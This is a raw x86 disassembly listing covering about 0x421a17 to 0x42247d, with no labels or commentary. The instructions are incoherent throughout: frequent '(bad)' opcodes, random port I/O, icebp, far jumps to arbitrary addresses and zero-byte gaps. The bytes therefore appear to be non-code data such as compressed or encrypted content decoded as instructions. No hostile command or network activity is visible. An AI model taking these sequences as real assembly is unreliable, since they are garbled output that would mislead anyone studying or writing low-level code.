  421a17:	ficom  DWORD PTR [edi]
  421a19:	push   eax
  421a1a:	sbb    al,0x7f
  421a1c:	pop    ss
  421a1d:	shl    ecx,1
  421a1f:	add    eax,0x58c5b60f
  421a24:	push   edi
  421a25:	in     al,dx
  421a26:	aaa    
  421a27:	xor    al,0xf3
  421a29:	bound  edi,QWORD PTR [ecx+eiz*4+0x46]
  421a2d:	jo     0x4219e5
  421a2f:	cmp    BYTE PTR [ebp+0x30],al
  421a32:	out    0x1d,al
  421a34:	(bad)  [ebx+edi*8]
  421a37:	push   edi
  421a38:	push   0x1c9c6def
  421a3d:	lds    edx,FWORD PTR [ecx-0x6e]
  421a40:	sub    DWORD PTR [eax+0x47],ebx
  421a43:	mov    edx,0x2729dd7
  421a48:	arpl   WORD PTR [ebx+ebp*1-0x95c7c39],bx
  421a4f:	inc    edi
  421a50:	mov    edx,0x93e3e5b4
  421a55:	and    DWORD PTR [eax+0x79],ebx
  421a58:	xor    edi,DWORD PTR [ecx-0x66bdb139]
  421a5e:	pop    es
  421a5f:	scas   eax,DWORD PTR es:[edi]
  421a60:	dec    ecx
  421a61:	xchg   edi,eax
  421a62:	out    dx,eax
  421a63:	in     al,0xe3
  421a65:	out    0x88,al
  421a67:	mov    edx,0x6dd02631
  421a6c:	push   ebp
  421a6d:	bound  ebx,QWORD PTR [ebx-0x3582305a]
  421a73:	sbb    ebp,DWORD PTR [ebx-0x54f62224]
  421a79:	cmp    DWORD PTR [esi-0x60862cb1],edx
  421a7f:	adc    al,0x56
  421a81:	ja     0x421af4
  421a83:	mov    ds:0xb01230ed,al
  421a88:	das    
  421a89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421a8a:	xor    BYTE PTR [edi-0x574e792d],0x79
  421a91:	mov    ebx,0x84a879fd
  421a96:	not    BYTE PTR [ebx-0xf0e4079]
  421a9c:	add    BYTE PTR [edi-0x5a11504a],ch
  421aa2:	mov    esp,0xe11f9a7a
  421aa7:	aaa    
  421aa8:	(bad)  
  421aa9:	fisub  WORD PTR [ebx+0x6d]
  421aac:	pop    ebx
  421aad:	dec    esp
  421aae:	xchg   ebx,eax
  421aaf:	inc    edx
  421ab0:	jg     0x421b2b
  421ab2:	sbb    eax,0x1085766a
  421ab7:	push   di
  421ab9:	adc    BYTE PTR [ebp+0x2dac33a3],dh
  421abf:	adc    ecx,edx
  421ac1:	xchg   ah,bh
  421ac3:	add    eax,0x776ef181
  421ac8:	nop
  421ac9:	adc    DWORD PTR [edx+0x2eab8c0f],ebp
  421acf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421ad0:	adc    ebp,DWORD PTR [edi+0x699b30df]
  421ad6:	push   ds
  421ad7:	push   esi
  421ad8:	stos   BYTE PTR es:[edi],al
  421ad9:	pop    ss
  421ada:	sub    al,0x80
  421adc:	jb     0x421aea
  421ade:	add    al,0x7d
  421ae0:	xchg   ecx,eax
  421ae1:	(bad)  
  421ae2:	data16 adc al,0xeb
  421ae5:	outs   dx,DWORD PTR ds:[esi]
  421ae6:	push   esp
  421ae7:	fs sbb al,0xfd
  421aea:	mov    ebp,0x25aa0fcb
  421aef:	adc    BYTE PTR [eax+0x66985a32],0xa8
  421af6:	ficom  DWORD PTR [edx-0x10]
  421af9:	jmp    FWORD PTR [bx+si+0x6a]
  421afd:	retf   0x617
  421b00:	icebp  
  421b01:	mov    ebx,DWORD PTR [eax]
  421b03:	sti    
  421b04:	xor    al,0x1f
  421b06:	add    eax,0xf83bda7e
  421b0b:	push   edx
  421b0c:	hlt    
  421b0d:	inc    edx
  421b0e:	popa   
  421b0f:	fsubp  st(3),st
	...
  421b71:	add    BYTE PTR [eax],al
  421b73:	add    BYTE PTR [esi],dl
  421b75:	cdq    
  421b76:	jmp    0x37400b48
  421b7b:	fild   DWORD PTR [ecx+eax*8+0x28]
  421b7f:	or     cl,BYTE PTR [edi]
  421b81:	fild   WORD PTR [eiz*1+0x167bb]
  421b88:	add    eax,0x37000001
  421b8d:	mov    dh,0x87
  421b8f:	imul   ecx,DWORD PTR [edi-0x5166929],0xaa352c1f
  421b99:	push   ecx
  421b9a:	mul    BYTE PTR ds:0x23681719
  421ba0:	mov    edx,0x6eb7633b
  421ba5:	inc    edx
  421ba6:	push   cs
  421ba7:	popa   
  421ba8:	mov    ch,0xe4
  421baa:	js     0x421bfe
  421bac:	cld    
  421bad:	aaa    
  421bae:	push   esp
  421baf:	xchg   edi,eax
  421bb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421bb1:	jno    0x421b36
  421bb3:	cdq    
  421bb4:	cmp    BYTE PTR [esp+eiz*8-0x65],ah
  421bb8:	xchg   DWORD PTR [edi+0xe93bd70],ebp
  421bbe:	or     ch,al
  421bc0:	mov    esp,0xf00a7862
  421bc5:	mov    eax,0x190c680a
  421bca:	jae    0x421b6e
  421bcc:	fs pusha 
  421bce:	call   0x6bfc2f6a
  421bd3:	cs jle 0x421b9f
  421bd6:	mov    bh,0x5a
  421bd8:	int    0x1b
  421bda:	inc    ebx
  421bdb:	pop    ss
  421bdc:	mov    edx,0x93e0258c
  421be1:	sbb    BYTE PTR [edx],cl
  421be3:	out    dx,eax
  421be4:	ja     0x421c5b
  421be6:	mov    bh,0x68
  421be8:	xor    al,0xe5
  421bea:	adc    esi,edi
  421bec:	out    dx,al
  421bed:	sti    
  421bee:	adc    dh,BYTE PTR [esi-0x6c]
  421bf1:	adc    ch,BYTE PTR [esi-0x4ee5db1f]
  421bf7:	mov    dh,0x42
  421bf9:	inc    esi
  421bfa:	(bad)  
  421bfb:	outs   dx,BYTE PTR ds:[esi]
  421bfc:	pop    DWORD PTR [ebx-0x23eaf3f4]
  421c02:	xchg   ebx,eax
  421c03:	mov    DWORD PTR [ebx+ebp*2],esi
  421c06:	int    0x1a
  421c08:	out    0xb6,al
  421c0a:	pop    eax
  421c0b:	and    DWORD PTR [edi+0x10f37952],esp
  421c11:	push   ecx
  421c12:	jnp    0x421c27
  421c14:	and    esp,DWORD PTR ds:[eax]
  421c17:	add    al,0x6f
  421c19:	xchg   ebp,eax
  421c1a:	mov    esp,0x51374964
  421c1f:	and    BYTE PTR [ebx],bh
  421c21:	xor    eax,0x872793ba
  421c26:	dec    esp
  421c27:	ss jle 0x421c99
  421c2a:	add    DWORD PTR [eax-0x4f],esp
  421c2d:	push   ss
  421c2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c2f:	push   edx
  421c30:	push   0x8cfad574
  421c35:	pusha  
  421c36:	xchg   ebx,eax
  421c37:	sub    esi,edi
  421c39:	add    dh,BYTE PTR [ebp+ebx*4+0x37]
  421c3d:	aam    0x9c
  421c3f:	loope  0x421c0a
  421c41:	and    eax,0x6448aebd
  421c46:	xchg   edi,eax
  421c47:	or     cl,al
  421c49:	(bad)  
  421c4a:	push   eax
  421c4b:	jge    0x421c21
  421c4d:	push   ebx
  421c4e:	push   cs
  421c4f:	mul    DWORD PTR [ebx]
  421c51:	les    ecx,FWORD PTR [esp+edi*1]
  421c54:	cwde   
  421c55:	add    al,0x3e
  421c57:	sti    
  421c58:	push   es
  421c59:	sub    esi,DWORD PTR [ebx-0x5e]
  421c5c:	fdiv   QWORD PTR [edx]
  421c5e:	sbb    DWORD PTR [edx],ebx
  421c60:	inc    ebx
  421c61:	fwait
  421c62:	cld    
  421c63:	ds pop ds
  421c65:	clc    
  421c66:	enter  0x48f,0x3d
  421c6a:	push   0x74697ce7
  421c6f:	dec    esi
  421c70:	sbb    dh,BYTE PTR [eiz*2-0x472b9204]
  421c77:	inc    esi
  421c78:	loopne 0x421cb3
  421c7a:	add    BYTE PTR [esi],bh
  421c7c:	adc    al,BYTE PTR [eax+edx*1+0x59]
  421c80:	jns    0x421ca7
  421c82:	pop    ebx
  421c83:	sub    eax,0xfe9548ee
  421c88:	adc    eax,0x83296907
  421c8d:	mov    DWORD PTR [edx],edi
  421c8f:	aas    
  421c90:	adc    BYTE PTR [eax],al
	...
  421cf2:	add    BYTE PTR [eax],al
  421cf4:	mov    al,0x6b
  421cf6:	mov    ch,0xe5
  421cf8:	(bad)  
  421cf9:	push   eax
  421cfb:	jg     0x421d51
  421cfd:	dec    edi
  421cfe:	xchg   edx,eax
  421cff:	dec    edi
  421d00:	clc    
  421d01:	sub    al,0x95
  421d03:	jns    0x421cc5
  421d05:	push   0x1050001
  421d0a:	add    BYTE PTR [eax],al
  421d0c:	xchg   ebp,eax
  421d0d:	sub    al,0x40
  421d0f:	in     eax,0x2f
  421d11:	daa    
  421d12:	pop    esp
  421d13:	xlat   BYTE PTR ds:[ebx]
  421d14:	dec    eax
  421d15:	dec    edx
  421d16:	mov    DWORD PTR [ebx-0x6ae1cc0f],ebp
  421d1c:	xchg   esi,eax
  421d1d:	sub    DWORD PTR [esi+esi*8+0xf],ebx
  421d21:	jmp    0x7eb85f9b
  421d26:	icebp  
  421d27:	(bad)  
  421d28:	std    
  421d29:	push   eax
  421d2a:	fsubr  st(4),st
  421d2c:	arpl   si,bx
  421d2e:	loop   0x421d7f
  421d30:	cmp    eax,0xd3d2d609
  421d35:	in     eax,0xd6
  421d37:	stc    
  421d38:	add    ebp,ebp
  421d3a:	call   0x12ffdd64
  421d3f:	div    esi
  421d41:	sbb    BYTE PTR [eax+esi*8-0xb],al
  421d45:	icebp  
  421d46:	mov    ss,WORD PTR [edx-0x1ffd3345]
  421d4c:	das    
  421d4d:	mov    al,ds:0x239aafd1
  421d52:	aam    0x7f
  421d54:	test   BYTE PTR [eax+0x61],ch
  421d57:	cmp    edi,edx
  421d59:	les    esi,FWORD PTR [ebx+0x1c]
  421d5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d5d:	call   0x3740f45d
  421d62:	fistp  WORD PTR [eax+0x11d505f6]
  421d68:	mov    esp,0xb7fc0977
  421d6d:	shl    al,1
  421d6f:	mov    edi,edi
  421d71:	cmp    al,0xab
  421d73:	jo     0x421d2b
  421d75:	outs   dx,BYTE PTR ds:[esi]
  421d76:	dec    esp
  421d77:	shl    cl,0x78
  421d7a:	xlat   BYTE PTR ds:[ebx]
  421d7b:	sahf   
  421d7c:	mov    bl,0x89
  421d7e:	loop   0x421d93
  421d80:	mov    esp,0xb8224a67
  421d85:	lods   eax,DWORD PTR ds:[esi]
  421d86:	or     eax,0x8ce62683
  421d8b:	jl     0x421d65
  421d8d:	sar    DWORD PTR [bp+si-0x43],cl
  421d91:	adc    BYTE PTR [ebp-0xd7d7e26],bl
  421d97:	mov    DWORD PTR [ebx+esi*4-0x35],edx
  421d9b:	scas   eax,DWORD PTR es:[edi]
  421d9c:	pop    edi
  421d9d:	fdivr  DWORD PTR [edi+0x3c]
  421da0:	mov    ds:0x2eeca143,eax
  421da5:	dec    ebx
  421da6:	lods   al,BYTE PTR ds:[esi]
  421da7:	and    DWORD PTR [ecx+0x690ce554],edx
  421dad:	add    DWORD PTR [ebx],0xdcd0e742
  421db3:	out    0x74,al
  421db5:	add    eax,0x96081814
  421dba:	nop
  421dbb:	mov    dh,0x2c
  421dbd:	pop    ebp
  421dbe:	xrelease mov BYTE PTR [ebx],bh
  421dc1:	gs pushf 
  421dc3:	pop    ds
  421dc4:	and    BYTE PTR [eax],dl
  421dc6:	sub    eax,0x294025da
  421dcb:	cmp    eax,0x7a54e5f7
  421dd0:	add    esp,DWORD PTR ds:[edi-0x3e]
  421dd4:	sub    eax,0x69b9f0fa
  421dd9:	dec    esi
  421dda:	mov    edi,0xcd9a803c
  421ddf:	cmp    al,0x59
  421de1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421de2:	jecxz  0x421dc2
  421de4:	push   ss
  421de5:	mov    edi,0x853f33d8
  421dea:	adc    al,0x3c
  421dec:	inc    edi
  421ded:	out    0x4b,al
  421def:	pop    esi
  421df0:	nop
  421df1:	jne    0x421d96
  421df3:	loop   0x421d9e
  421df5:	popa   
  421df6:	xor    eax,0xdb1a5821
  421dfb:	adc    eax,0xaaf837ce
  421e00:	push   ebx
  421e01:	or     edi,0x2b
  421e04:	jae    0x421de4
  421e06:	dec    ecx
  421e07:	out    0xe,al
  421e09:	pop    es
  421e0a:	int3   
  421e0b:	pop    es
  421e0c:	jmp    0x421e68
  421e0e:	adc    eax,0x583d
	...
  421e73:	add    bh,cl
  421e75:	mov    eax,ds:0xbf7f851b
  421e7a:	fucomip st,st(3)
  421e7c:	push   es
  421e7d:	ins    BYTE PTR es:[edi],dx
  421e7e:	xor    al,0xb9
  421e80:	pop    esi
  421e81:	sti    
  421e82:	sahf   
  421e83:	loopne 0x421e4a
  421e85:	imul   eax,DWORD PTR [ecx],0x10500
  421e8b:	add    BYTE PTR [ebx-0x200de0af],dl
  421e91:	jmp    0x421ed7
  421e93:	push   edi
  421e94:	nop
  421e95:	lea    eax,[eax+0x493fe1c8]
  421e9b:	cwde   
  421e9c:	icebp  
  421e9d:	rol    bl,0x60
  421ea0:	sub    BYTE PTR [eax+ecx*1],0xbf
  421ea4:	jge    0x421e7f
  421ea6:	jg     0x421edf
  421ea8:	mov    edi,0xa7b2d67a
  421ead:	adc    al,0x5b
  421eaf:	setno  bh
  421eb2:	and    ah,BYTE PTR [esi+0x51]
  421eb5:	(bad)  
  421eb6:	ror    DWORD PTR [esp+ebp*1],1
  421eb9:	sbb    eax,DWORD PTR [edx]
  421ebb:	sub    DWORD PTR [edx+0x6a],ebx
  421ebe:	sbb    eax,0x9fde8b5f
  421ec3:	or     ch,dh
  421ec5:	mov    es,WORD PTR [edx-0x10e18739]
  421ecb:	xlat   BYTE PTR ds:[ebx]
  421ecc:	stos   DWORD PTR es:[edi],eax
  421ecd:	lahf   
  421ece:	gs in  eax,dx
  421ed0:	lahf   
  421ed1:	bound  ebp,QWORD PTR [edi+ecx*1+0x50eecb94]
  421ed8:	repnz (bad) 
  421eda:	cmp    al,BYTE PTR [eax]
  421edc:	inc    edi
  421edd:	or     al,0x1d
  421edf:	lock je 0x421f28
  421ee2:	ret    
  421ee3:	pop    eax
  421ee4:	into   
  421ee5:	cli    
  421ee6:	aaa    
  421ee7:	xchg   DWORD PTR [edx],edx
  421ee9:	sbb    eax,0x4f0ad6ab
  421eee:	(bad)  
  421eef:	and    DWORD PTR [ecx*8+0x23f30149],ebp
  421ef6:	gs mov esi,0x614e31b5
  421efc:	lds    ebp,FWORD PTR [edi+esi*4]
  421eff:	in     al,dx
  421f00:	mov    edx,0xd53a04c0
  421f05:	leave  
  421f06:	(bad)  
  421f07:	pop    esi
  421f08:	(bad)  
  421f09:	cwde   
  421f0a:	add    eax,0xdc3650b7
  421f0f:	dec    esp
  421f10:	aas    
  421f11:	sub    BYTE PTR [edi-0x6d],al
  421f14:	cmp    esp,DWORD PTR [ebx-0x786eeca6]
  421f1a:	sub    al,0x38
  421f1c:	pop    eax
  421f1d:	jmp    0x4a216c9f
  421f22:	popf   
  421f23:	pop    esi
  421f24:	sbb    edx,eax
  421f26:	adc    al,0xad
  421f28:	es dec esi
  421f2a:	bound  esi,QWORD PTR [edx+0x43]
  421f2d:	mov    DWORD PTR ds:0xd6d6d476,ebx
  421f33:	xor    edx,DWORD PTR [edi-0x59]
  421f36:	fisubr DWORD PTR [eax-0x49]
  421f39:	out    dx,al
  421f3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421f3b:	stc    
  421f3c:	cmp    edx,DWORD PTR [ecx+0x35d35124]
  421f42:	push   eax
  421f43:	push   edx
  421f44:	lock mov ebp,0x217c94d5
  421f4a:	mov    bh,0xc4
  421f4c:	adc    DWORD PTR [ebx],0x539bf907
  421f52:	inc    edx
  421f53:	inc    esi
  421f54:	add    eax,0x2b8c29a4
  421f59:	inc    ebx
  421f5a:	jecxz  0x421edf
  421f5c:	inc    edx
  421f5d:	mov    ?,WORD PTR [edx]
  421f5f:	icebp  
  421f60:	adc    bl,BYTE PTR [ebp-0x4b]
  421f63:	mov    edx,0xb5aea282
  421f68:	mov    al,0x95
  421f6a:	xlat   BYTE PTR ds:[ebx]
  421f6b:	sub    BYTE PTR [ebp*4-0x56d61801],dl
  421f72:	and    al,0x26
  421f74:	and    ah,0x25
  421f77:	shl    DWORD PTR [ebx-0x1a],0xef
  421f7b:	xor    eax,0xcd126084
  421f80:	iret   
  421f81:	popa   
  421f82:	mov    esi,0xf30ec1a7
  421f87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421f88:	call   0x572930c7
  421f8d:	push   esi
  421f8e:	int3   
  421f8f:	icebp  
  421f90:	adc    eax,DWORD PTR [eax]
	...
  421ff2:	add    BYTE PTR [eax],al
  421ff4:	imul   eax,DWORD PTR [esi],0xffffff8f
  421ff7:	dec    edi
  421ff8:	out    dx,eax
  421ff9:	iret   
  421ffa:	jmp    0x422022
  421ffc:	aas    
  421ffd:	in     eax,dx
  421ffe:	push   es
  421fff:	data16 daa 
  422001:	sbb    DWORD PTR [edi-0x3a],eax
  422004:	retf   0x16a
  422007:	add    BYTE PTR ds:0x52000001,al
  42200d:	pop    eax
  42200e:	loopne 0x42200b
  422010:	pushf  
  422011:	dec    edx
  422012:	fst    st(6)
  422014:	ror    BYTE PTR [edx+0x12],1
  422017:	cmp    eax,0xfc73ee4f
  42201c:	imul   ecx,DWORD PTR [edx],0x1c86688c
  422022:	sahf   
  422023:	iret   
  422024:	jne    0x421fd0
  422026:	mov    eax,0x7832ad8e
  42202b:	lahf   
  42202c:	and    bh,dl
  42202e:	stc    
  42202f:	fcom   QWORD PTR ds:0x17955f01
  422035:	jo     0x422013
  422037:	xchg   ecx,eax
  422038:	cmp    DWORD PTR [eax+0x1e86c72e],ebp
  42203e:	sbb    DWORD PTR [edx+0x64809cce],0xffffffd8
  422045:	in     eax,0xb4
  422047:	sbb    DWORD PTR [eax],0x27a6b4f5
  42204d:	stos   DWORD PTR es:[edi],eax
  42204e:	(bad)  
  42204f:	cmp    eax,0x6bde9e85
  422054:	pop    ecx
  422055:	rcr    DWORD PTR [edx],1
  422057:	push   bx
  422059:	cmp    eax,0xbbd5993e
  42205e:	loope  0x421fe5
  422060:	or     BYTE PTR [ebp+esi*8-0x7c28d0a9],bh
  422067:	mov    ecx,0xd6799b49
  42206c:	sub    al,0x82
  42206e:	xchg   esp,eax
  42206f:	jge    0x4220af
  422071:	dec    edx
  422072:	(bad)  
  422073:	cdq    
  422074:	pop    esi
  422075:	outs   dx,DWORD PTR ds:[esi]
  422076:	in     al,0x50
  422078:	push   ecx
  422079:	pop    ebp
  42207a:	lahf   
  42207b:	cmp    eax,0x4ba6a8ae
  422080:	dec    edx
  422081:	popf   
  422082:	and    al,0xd0
  422085:	xchg   cl,ch
  422087:	aaa    
  422088:	xor    edx,DWORD PTR [ebp-0x7e]
  42208b:	loop   0x4220e4
  42208d:	test   al,0x29
  42208f:	fcom   DWORD PTR [ebp+esi*4+0x1b03cb32]
  422096:	or     eax,ecx
  422098:	and    DWORD PTR [ebx],0xb9f66e46
  42209e:	ins    BYTE PTR es:[edi],dx
  42209f:	sbb    DWORD PTR [edi+0x52],eax
  4220a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4220a3:	ret    0x3643
  4220a6:	mov    bh,0x24
  4220a8:	push   edi
  4220a9:	(bad)  
  4220aa:	jbe    0x422054
  4220ac:	adc    esp,DWORD PTR [eax-0x5d]
  4220af:	pop    ds
  4220b0:	mov    ecx,0xf31fb6af
  4220b5:	pop    esp
  4220b6:	xor    bl,bl
  4220b8:	sahf   
  4220b9:	xlat   BYTE PTR ds:[ebx]
  4220ba:	ins    BYTE PTR es:[edi],dx
  4220bb:	add    DWORD PTR [ecx-0x4733f3f],edi
  4220c1:	xlat   BYTE PTR ds:[ebx]
  4220c2:	dec    edx
  4220c3:	or     BYTE PTR [edi-0x1ea89229],0x1a
  4220ca:	push   edx
  4220cb:	test   al,0x54
  4220cd:	les    ecx,FWORD PTR [esi+0x50]
  4220d0:	jno    0x422070
  4220d2:	icebp  
  4220d3:	ss into 
  4220d5:	cmc    
  4220d6:	cmp    edx,DWORD PTR [edx+0x6e]
  4220d9:	xchg   edi,eax
  4220da:	iret   
  4220db:	lea    ebx,[ebx]
  4220dd:	enter  0xa00f,0x10
  4220e1:	shl    DWORD PTR [ebx-0x79],cl
  4220e4:	mov    esi,0x7f7ba680
  4220e9:	scas   eax,DWORD PTR es:[edi]
  4220ea:	fwait
  4220eb:	or     eax,0xfb96e06f
  4220f0:	out    0x4,eax
  4220f2:	gs dec edi
  4220f4:	adc    BYTE PTR [edx+0x64],ah
  4220f7:	add    eax,0x2194f5eb
  4220fc:	xchg   edx,eax
  4220fd:	(bad)  
  4220fe:	bound  ebx,QWORD PTR [edi-0x24]
  422101:	(bad)  
  422103:	jmp    0x57f8a8ba
  422108:	xchg   sp,ax
  42210a:	add    eax,0x91deff97
  42210f:	pop    edx
  422110:	jb     0x422112
	...
  422172:	add    BYTE PTR [eax],al
  422174:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422175:	push   edx
  422176:	jnp    0x422175
  422178:	(bad)  
  422179:	std    
  42217a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42217b:	pop    ebx
  42217c:	dec    edx
  42217d:	sub    al,0x42
  42217f:	sub    ebx,ebp
  422181:	push   edi
  422182:	ss ds iret 
  422185:	imul   eax,DWORD PTR [ecx],0x0
  422188:	add    eax,0x4000001
  42218d:	in     eax,0x89
  42218f:	jae    0x4221c4
  422191:	pushf  
  422192:	inc    eax
  422193:	add    BYTE PTR [edi],0x74
  422196:	ins    DWORD PTR es:[edi],dx
  422197:	ficomp WORD PTR [ebp-0x5a6f9af3]
  42219d:	(bad)  
  42219e:	retf   0x836a
  4221a1:	ret    0x40be
  4221a4:	loopne 0x422205
  4221a6:	pop    esp
  4221a7:	sub    al,0x67
  4221a9:	or     dl,BYTE PTR [ebx-0x24]
  4221ac:	jno    0x4221be
  4221ae:	or     dl,ah
  4221b0:	xchg   edx,eax
  4221b1:	sub    ah,cl
  4221b3:	mov    edx,edi
  4221b5:	loop   0x4221db
  4221b7:	loope  0x422220
  4221b9:	add    edi,DWORD PTR ds:[edi]
  4221bc:	jge    0x42223b
  4221be:	mov    al,ds:0xa624f88a
  4221c3:	add    al,0xe5
  4221c5:	hlt    
  4221c6:	sub    BYTE PTR [eax],bh
  4221c8:	push   ds
  4221c9:	call   0xbc6104e4
  4221ce:	cld    
  4221cf:	xor    DWORD PTR [eax],edi
  4221d1:	xor    edx,DWORD PTR [eax-0x74]
  4221d4:	ja     0x42222d
  4221d6:	sub    DWORD PTR ds:0x17a984af,esp
  4221dc:	rcr    ebp,1
  4221de:	pop    esp
  4221df:	sub    edi,ecx
  4221e1:	ins    DWORD PTR es:[edi],dx
  4221e2:	daa    
  4221e3:	or     ebp,eax
  4221e5:	test   DWORD PTR [edx],0xefc28683
  4221eb:	out    0x1,al
  4221ed:	popa   
  4221ee:	loopne 0x422205
  4221f0:	call   esi
  4221f2:	scas   eax,DWORD PTR es:[edi]
  4221f3:	fnstsw WORD PTR [ebp+0x15]
  4221f6:	or     ch,BYTE PTR [ebp+0x21]
  4221f9:	shl    BYTE PTR [edx],0xf
  4221fc:	adc    eax,0x3609b21c
  422201:	sti    
  422202:	imul   edi,DWORD PTR ds:0xaa242c68,0xffffffaa
  422209:	outs   dx,DWORD PTR ds:[esi]
  42220a:	xor    al,BYTE PTR [eax+0x6e5cc634]
  422210:	pushf  
  422211:	fsub   DWORD PTR [ecx-0x29e73a3a]
  422217:	mov    ebx,0x276ac88b
  42221c:	jb     0x4221ef
  42221e:	sbb    eax,DWORD PTR [edx+0x1b]
  422221:	pop    edx
  422222:	cmp    BYTE PTR [ebp+0x43],ch
  422225:	inc    eax
  422226:	ror    ecx,0xa8
  422229:	mov    edi,0xc21b5b88
  42222e:	pop    es
  42222f:	icebp  
  422230:	shl    BYTE PTR [edi+0x76c3c0b4],1
  422236:	jle    0x42220d
  422238:	mov    esp,DWORD PTR [esi-0x15799a8c]
  42223e:	jbe    0x4222a9
  422240:	jecxz  0x422200
  422242:	add    edx,DWORD PTR [ecx-0x78]
  422245:	xchg   esi,eax
  422246:	out    dx,eax
  422247:	pop    esi
  422248:	mov    DWORD PTR [ecx+ebp*2+0x19],eax
  42224c:	push   eax
  42224d:	ficom  WORD PTR [esp+ebp*2]
  422250:	(bad)  
  422252:	sbb    eax,0xbfe850f0
  422257:	add    al,0x89
  422259:	mov    al,0xcd
  42225b:	pushw  es
  42225d:	out    0x2d,eax
  42225f:	push   ss
  422260:	push   esi
  422261:	dec    ecx
  422262:	xchg   edx,eax
  422263:	inc    ebx
  422264:	cdq    
  422265:	jecxz  0x422224
  422267:	(bad)  
  422268:	xor    al,0xd1
  42226a:	sar    DWORD PTR [esi-0x59],cl
  42226d:	arpl   sp,bx
  42226f:	jnp    0x42228e
  422271:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422272:	enter  0x6795,0x81
  422276:	pop    ebp
  422277:	stos   BYTE PTR es:[edi],al
  422278:	popa   
  422279:	and    bh,BYTE PTR [esi+0x2e]
  42227c:	ret    
  42227d:	or     edx,DWORD PTR [edi+0x77]
  422280:	xchg   ebp,eax
  422281:	dec    esp
  422282:	repnz fs cs push ebx
  422286:	sbb    DWORD PTR [ecx-0x6a],ebp
  422289:	and    al,0xe4
  42228b:	mov    dl,0x2
  42228d:	sar    cl,0x23
  422290:	push   edx
	...
  4222f1:	add    BYTE PTR [eax],al
  4222f3:	add    BYTE PTR [edi-0x10085213],cl
  4222f9:	neg    edi
  4222fb:	std    
  4222fc:	sub    ebx,DWORD PTR [ebp+0x71]
  4222ff:	dec    ecx
  422300:	fwait
  422301:	cmp    bl,ch
  422303:	or     eax,0x16cd4
  422308:	add    eax,0x93000001
  42230d:	cld    
  42230e:	xchg   ebp,eax
  42230f:	push   ds
  422310:	test   eax,0xf58800d
  422315:	sahf   
  422316:	cmp    BYTE PTR [eax],ch
  422318:	ds ds mov ch,0x58
  42231c:	inc    edx
  42231d:	das    
  42231e:	push   edi
  42231f:	and    dh,BYTE PTR [edx-0x312d5858]
  422325:	xchg   esi,eax
  422326:	xor    ebx,ebx
  422328:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422329:	adc    DWORD PTR [edx+0xb6015fe],ecx
  42232f:	rcr    BYTE PTR [ecx+0x39],1
  422332:	ror    cl,0xbf
  422335:	add    al,0x9b
  422337:	adc    esi,DWORD PTR [edx-0x1d]
  42233a:	iret   
  42233b:	sub    DWORD PTR [eax-0x5c4f0bb6],eax
  422341:	ror    BYTE PTR [esi+0x6d],cl
  422344:	rol    DWORD PTR [ebp-0x7d90a0de],cl
  42234a:	fs mov ah,0x28
  42234d:	and    BYTE PTR [esi+edx*8+0x6a0cf215],dh
  422354:	xchg   esi,eax
  422355:	add    BYTE PTR [eax+0x5cdf937a],ah
  42235b:	dec    esi
  42235c:	jno    0x42239f
  42235e:	arpl   WORD PTR [edx],di
  422360:	lock adc bh,ch
  422363:	and    al,BYTE PTR [ebp+0x2b]
  422366:	push   eax
  422367:	xchg   ebx,esp
  422369:	cmp    ch,0x6b
  42236c:	mov    esi,0x93c744d6
  422371:	test   eax,0x7d92d481
  422376:	iret   
  422377:	mov    ebp,0xaf1c5e1f
  42237c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42237d:	cmp    DWORD PTR [edi],eax
  42237f:	icebp  
  422380:	out    dx,eax
  422381:	mov    es,WORD PTR [eax]
  422383:	and    cl,BYTE PTR [edx+0x48]
  422386:	mov    ds:0xcfceb85a,al
  42238b:	test   esi,ebp
  42238d:	gs push es
  42238f:	jl     0x4223a9
  422391:	repnz mov ah,0xe2
  422394:	call   0x24f1:0x61121897
  42239b:	pushf  
  42239c:	pop    esi
  42239d:	test   dh,bh
  42239f:	out    dx,al
  4223a0:	or     ecx,DWORD PTR [edi]
  4223a2:	fistp  DWORD PTR [esi-0x1051b6b8]
  4223a8:	pop    ss
  4223a9:	sub    ebx,DWORD PTR [edi-0x5112d829]
  4223af:	and    eax,0x16e7d1f0
  4223b4:	xlat   BYTE PTR gs:[ebx]
  4223b6:	mov    ecx,0xa060c156
  4223bb:	sbb    ah,BYTE PTR [ecx-0x10]
  4223be:	sar    ebp,cl
  4223c0:	dec    ecx
  4223c1:	ficom  WORD PTR [ebx]
  4223c3:	in     al,0x3c
  4223c5:	pop    es
  4223c6:	xor    edi,edi
  4223c8:	ins    DWORD PTR es:[edi],dx
  4223c9:	pushf  
  4223ca:	scas   eax,DWORD PTR es:[edi]
  4223cb:	arpl   WORD PTR [ebx-0x53],cx
  4223ce:	or     al,0xc6
  4223d0:	jg     0x42235a
  4223d2:	sub    DWORD PTR [ecx+ebp*4],0xe0d924f2
  4223d9:	sbb    BYTE PTR [edx+0x28dd93e0],ch
  4223df:	mov    al,0x78
  4223e1:	test   BYTE PTR [edi+0x1c],dh
  4223e4:	dec    esp
  4223e5:	push   ss
  4223e6:	das    
  4223e7:	mov    ecx,0xe458b1b3
  4223ec:	addr16 pusha 
  4223ee:	adc    BYTE PTR ds:[ebx+ebp*1],dl
  4223f2:	mov    ds:0x315258ac,eax
  4223f7:	cmp    eax,0x90e0081f
  4223fc:	mov    BYTE PTR [esi],ch
  4223fe:	inc    eax
  4223ff:	push   0x5dd7b442
  422404:	stos   BYTE PTR es:[edi],al
  422405:	fld    st(6)
  422407:	and    al,0x46
  422409:	mov    dh,0x2c
  42240b:	mov    al,bh
  42240d:	push   cs
  42240e:	mov    dl,0x4b
  422410:	leave  
	...
  422471:	add    BYTE PTR [eax],al
  422473:	add    BYTE PTR [edx-0x7e],dl
  422476:	cs imul edi,esi,0xbbbb57ed
  42247d:	xor    ebp,esp
